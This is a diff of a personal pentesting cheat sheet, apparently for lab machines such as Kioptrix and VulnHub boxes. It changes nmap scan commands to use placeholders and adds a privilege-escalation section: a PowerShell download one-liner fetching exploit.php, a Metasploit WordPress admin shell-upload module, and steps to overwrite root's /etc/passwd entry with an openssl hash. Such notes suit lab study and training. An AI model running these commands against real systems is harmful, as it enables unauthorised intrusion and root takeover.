@@ -10,13 +10,13 @@ find out the ip of the machine in the network
 
 *SSH fast UDP*
 
-    nmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T3 -oN /root/kioptrix.txt 192.168.156.102
+    nmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T3 -oN /root/result.txt <ip>
 
     -sU                         UDP Scan
 
 *SSH intensive* 
 
-    nmap -Pn -sS --stats-every 3m --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p1-65535 -oN /root/desktop/kioptrix.txt 192.168.156.102
+    nmap -Pn -sS --stats-every 3m --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p1-65535 -oN /root/desktop/result.txt <ip>
 
     -Pn                         Do not ping the host
     -sS                         Stealth Scan
@@ -27,19 +27,19 @@ find out the ip of the machine in the network
     -T4                         Intesitiy of 4
     -p1-65535                   scan all ports
     -oN <where to save it>      save the result to a specific file
-    <target>                    ip e.g.
+    <ip>                        ip e.g.
 
 *Specific Ports Scan*
 
-    sudo nmap -Pn -nvv -p 22,80,8080 --version intensity 9 -A -oN /home/kali/Desktop/kioptrix.txt <host>
+    sudo nmap -Pn -nvv -p 22,80,8080 --version-intensity 9 -A -oN /home/kali/Desktop/result.txt <ip>
 
     -nvv 
     -Pn
     -p 22,80,111,139
     --version intensity 9 
     -A
-    -oN /root/kioptrix1_detailed.txt
-    <host>
+    -oN /root/result.txt
+    <ip>
 
 **Enumeration**
 
@@ -715,6 +715,69 @@ For old windows machines
 
     Also works as oneliner 
     echo $storage = $pwd&$webclient = New-Object System.Net.Webclient&$url = "http://<ip>/exploit.php"&$file = "exploit.php"&$webclient.DownloadFile($url,$file) >> get.ps1
+
+
+**Privilege Escalation**
+
+Guides for privilege Escalation
+
+Basic Pentesting 1 OVA
+
+    https://www.vulnhub.com/entry/basic-pentesting-1,216/ 
+
+
+*Guides*
+
+Windows
+
+    https://www.fuzzysecurity.com/tutorials/16.html 
+
+Linux
+
+    https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
+
+
+*Admin Shell upload - Wordpress*
+
+Will create a reverse shell with a php shell and cleanup on its own. Need Wordpress admin access.
+
+    use exploit/unix/webapp/wp_admin_shell_upload
+    
+
+*Linuxprivchecker*
+
+    https://github.com/GammaG/linuxprivchecker
+
+Then put in it apache directory. On the target machine make a file transfer to pull this.
+This is the python version, but there are alternative versions.
+
+    Copy the kernel as first thing and check if there is any exploits available.
+    Check World Writeable Files (maybe passwd is in there)
+
+End the Channel und go back to Meterpreter
+
+    edit /etc/passwd
+    (works as vi)
+
+Open another terminal to generate the pw hash
+
+    openssl passwd --help
+    openssl passwd -1 (gives you an md5 hash)
+
+Go back to meterpreter
+
+    paste the hash instead of the "x" for root
+    shell 
+    python -c 'import pty; pty.spawn("/bin/bash")'
+    su root
+
+
+
+
+
+
+
+
 
 
 
